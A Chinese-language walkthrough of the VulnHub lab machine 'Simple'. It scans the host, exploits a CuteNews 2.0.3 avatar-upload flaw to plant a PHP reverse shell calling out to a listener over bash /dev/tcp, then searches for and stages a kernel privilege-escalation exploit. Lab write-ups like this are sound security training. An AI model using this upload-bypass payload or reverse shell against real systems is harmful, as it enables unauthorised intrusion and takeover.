
**靶机地址**：[SecTalks: BNE0x03 - Simple ~ VulnHub](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/)
**Download (Mirror)**: [https://download.vulnhub.com/sectalks/Simple.ova](https://download.vulnhub.com/sectalks/Simple.ova)

### 信息收集
先做主机发现

```BASH
arp-scan -l
```

![](imgs/f3341d3441ccc8b959226c59071c5a55_MD5.jpeg)

```BASH
nmap --min-rate 10000 -p- 172.16.31.10
```
![](imgs/a9075624362ea6e64cecc0b86e308fd4_MD5.jpeg)
发现只开放了一个80端口


### 漏洞利用

访问web

![](imgs/a2376bbb87856c509dbf9c098752239b_MD5.jpeg)

可以看到`CuteNews v.2.0.3`,这个应该是CuteNews框架的版本号,像这种是很容易爆洞的,因为版本很低，可以搜索相关历史漏洞


![](imgs/e02cc737e1e84c69ae5ea1a1e783b7b9_MD5.jpeg)

下载`37474.txt`到当前路径

```bash
 searchsploit  cutenews 2.0.3 -m 37474.txt
```

![](imgs/39c8bf4ffcfcbea8470f62a04d08e494_MD5.jpeg)


告诉了我们利用方法

![](imgs/77941761eb5781f842304f2e73a8f15c_MD5.jpeg)


先注册一个用户，然后登录

![](imgs/0a4f95c0173f0c8a4f2571b6f8fda9ec_MD5.jpeg)


![](imgs/a0bef133820ae5fd63c6a9af7cb73acb_MD5.jpeg)


来到`http://172.16.31.10/index.php?mod=main&opt=personal`这个路径

![](imgs/fbd02e581959e31a4fc5e070fb33ba7b_MD5.jpeg)




```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/5678 0>&1'"); ?>
```


我这里先上传一个正常的图片，然后修改数据包


![](imgs/29e81c84fec7c8afd7c4ad47cb3b8f0d_MD5.jpeg)


![](imgs/3b9574ff0a14567379396b07fa220a24_MD5.jpeg)


![](imgs/7884e3e359557d4a410c827057ade337_MD5.jpeg)

http://172.16.31.10/uploads/，可以看到上传成功了

![](imgs/ea954800fb50d0e5295d2d452f42df80_MD5.jpeg)



物理机开启监听

![](imgs/39c4b30e6e9ffe24e287ee125f5860fd_MD5.jpeg)



成功反弹

![](imgs/04994844047d0971fe4e3d0c40fb9f9a_MD5.jpeg)


![](imgs/8054c490e3692d2d0296ed5fc63de597_MD5.jpeg)

### 提权

进入靶机，发现是个低权限的用户，那么我们就要进行提权了，这里我尝试了一般的提权方法，比如SUID提权和sudo -l 命令以及查看进程都没有发现可以提权的点。

![](imgs/938f6db97285818477a037ac58596ba2_MD5.jpeg)

拿到shell是因为这个框架漏洞版本太低，那么我们进行提取操作的时候，是不是也可以利用这点呢，我直接uname -a 查看内核版本信息，好家伙还真是，这个内核版本确实低，可以被我们所利用

![](imgs/065f5b4a990e868dcb0266ea4a346b12_MD5.jpeg)

searchspoit搜索对应版本的提取漏洞

```bash
 searchsploit kernel 3.16.0-generic | grep "Privilege Escalation"
```

![](imgs/d04698640e0190b75474bb3e578780a0_MD5.jpeg)

内核提权就是这样的，有点靠运气的成分了，就得看我们检索的关键字是什么了，然后还得挨个去尝试！
尝试红队笔记大佬的方法
```bash
searchsploit Ubuntu 14.04 |grep "Privilege Escalation"
```
![](imgs/43d54cb2427b2b6cff3ab038c953f81b_MD5.jpeg)

下载exp
```bash
searchsploit -m 37088.c
```

然后开启web服务

```php
php -S 0:6868
```


靶机下载EXP

![](imgs/7cc5d6c55fd4cf66242d0270672581f8_MD5.jpeg)


![](imgs/038c11f8fec8c1db61808d27344b8c35_MD5.jpeg)